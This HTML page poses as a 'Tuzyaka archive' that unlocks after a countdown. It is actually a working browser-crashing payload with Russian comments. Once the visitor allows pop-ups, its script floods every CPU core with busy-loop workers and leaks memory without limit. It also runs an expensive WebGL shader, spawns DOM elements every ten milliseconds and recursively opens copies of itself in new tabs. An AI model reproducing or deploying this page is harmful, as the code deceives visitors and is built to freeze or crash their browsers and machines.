<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Tuzyaka archive</title>
    <style>
        body {
            background-color: #000;
            color: #0f0;
            font-family: 'Courier New', monospace;
            text-align: center;
            padding-top: 40%;
            margin: 0;
            overflow: hidden;
        }
        h1 {
            font-size: 2em;
            text-shadow: 0 0 10px #0f0;
        }
        #countdown {
            font-size: 1.5em;
            color: #f00;
            text-shadow: 0 0 5px #f00;
            margin-top: 20px;
        }
        canvas {
            display: none;
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
        }
    </style>
</head>
<body>
    <h1>Tuzyaka archive</h1>
    <div id="countdown">Unlocking in: 10</div>

    <canvas id="canvas"></canvas>

    <script>
        // Таймер 10 секунд
        let secondsLeft = 10;
        const countdownElement = document.getElementById("countdown");
        const countdown = setInterval(() => {
            secondsLeft--;
            countdownElement.textContent = `Unlocking in: ${secondsLeft}`;
            if (secondsLeft <= 0) {
                clearInterval(countdown);
                requestTabAccess();
            }
        }, 1000);

        // Запрос разрешения на вкладки
        function requestTabAccess() {
            document.body.innerHTML = "<h1>Allow Tabs to Unlock Archive</h1>";
            checkTabPermission();
        }

        // Проверка разрешения на вкладки
        function checkTabPermission() {
            const testTab = window.open("", "_blank", "width=1,height=1");
            if (testTab) {
                testTab.close();
                unleashTabCrash(); // Разрешение получено, начинаем
            } else {
                setTimeout(checkTabPermission, 500); // Ждём разрешения
            }
        }

        // Максимальный крах с вкладками
        function unleashTabCrash() {
            document.body.innerHTML = "<h1>Archive Unleashed</h1>";
            document.body.style.color = "#f00";
            document.body.style.textShadow = "0 0 10px #f00";

            // 1. Перегрузка процессора
            function overloadCPU() {
                const workerCount = navigator.hardwareConcurrency || 2;
                for (let i = 0; i < workerCount * 2; i++) {
                    const workerCode = `
                        onmessage = function() {
                            while (true) {
                                let x = 0;
                                for (let i = 0; i < 3000000; i++) {
                                    x += Math.sin(Math.random()) * Math.cos(Math.random());
                                }
                            }
                        };
                    `;
                    try {
                        const blob = new Blob([workerCode], { type: "application/javascript" });
                        const worker = new Worker(URL.createObjectURL(blob));
                        worker.postMessage("start");
                    } catch (e) {
                        setInterval(() => {
                            let x = 0;
                            for (let i = 0; i < 3000000; i++) {
                                x += Math.sin(Math.random()) * Math.cos(Math.random());
                            }
                        }, 1);
                    }
                }
            }

            // 2. Перегрузка памяти
            function overloadMemory() {
                let memorySink = [];
                function leak() {
                    for (let i = 0; i < 1000; i++) {
                        memorySink.push(new Uint32Array(1000000));
                    }
                    setTimeout(leak, 0);
                }
                leak();
            }

            // 3. Перегрузка GPU через WebGL
            function overloadGPU() {
                const canvas = document.getElementById("canvas");
                canvas.style.display = "block";
                canvas.width = window.innerWidth * 3;
                canvas.height = window.innerHeight * 3;
                const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
                if (!gl) return;

                const vsSource = `
                    attribute vec4 aPosition;
                    void main() {
                        gl_Position = aPosition;
                    }
                `;
                const fsSource = `
                    precision highp float;
                    uniform float uTime;
                    void main() {
                        float r = 0.0, g = 0.0, b = 0.0;
                        for (int i = 0; i < 3000; i++) {
                            r += sin(float(i) * uTime * 0.1);
                            g += cos(float(i) * uTime * 0.2);
                            b += tan(float(i) * uTime * 0.3);
                        }
                        gl_FragColor = vec4(mod(r, 1.0), mod(g, 1.0), mod(b, 1.0), 1.0);
                    }
                `;

                const vertexShader = gl.createShader(gl.VERTEX_SHADER);
                gl.shaderSource(vertexShader, vsSource);
                gl.compileShader(vertexShader);
                const fragmentShader = gl.createShader(gl.FRAGMENT_SHADER);
                gl.shaderSource(fragmentShader, fsSource);
                gl.compileShader(fragmentShader);
                const program = gl.createProgram();
                gl.attachShader(program, vertexShader);
                gl.attachShader(program, fragmentShader);
                gl.linkProgram(program);
                gl.useProgram(program);

                const positionBuffer = gl.createBuffer();
                gl.bindBuffer(gl.ARRAY_BUFFER, positionBuffer);
                gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1, 1,-1, -1,1, 1,1]), gl.STATIC_DRAW);

                const aPosition = gl.getAttribLocation(program, "aPosition");
                gl.enableVertexAttribArray(aPosition);
                gl.vertexAttribPointer(aPosition, 2, gl.FLOAT, false, 0, 0);

                const uTime = gl.getUniformLocation(program, "uTime");
                function render() {
                    gl.uniform1f(uTime, performance.now() / 1000);
                    gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
                    requestAnimationFrame(render);
                }
                render();
            }

            // 4. Перегрузка DOM
            function overloadDOM() {
                function createChaos() {
                    for (let i = 0; i < 100; i++) {
                        const div = document.createElement("div");
                        div.style.position = "absolute";
                        div.style.left = Math.random() * 100 + "%";
                        div.style.top = Math.random() * 100 + "%";
                        div.style.width = "150px";
                        div.style.height = "150px";
                        div.style.background = `hsl(${Math.random() * 360}, 100%, 50%)`;
                        div.style.boxShadow = "0 0 80px rgba(255,0,0,1)";
                        div.style.transform = `rotate(${Math.random() * 360}deg)`;
                        document.body.appendChild(div);
                    }
                    setTimeout(createChaos, 10);
                }
                createChaos();
            }

            // 5. Усиленная перегрузка вкладок
            function overloadTabs() {
                function openTab() {
                    const newTab = window.open(window.location.href, "_blank");
                    if (newTab) {
                        setTimeout(openTab, 0); // Максимальная скорость после разрешения
                    }
                }
                openTab();
            }

            // Запускаем всё
            overloadCPU();
            overloadMemory();
            overloadGPU();
            overloadDOM();
            overloadTabs();
        }
    </script>
</body>
</html>
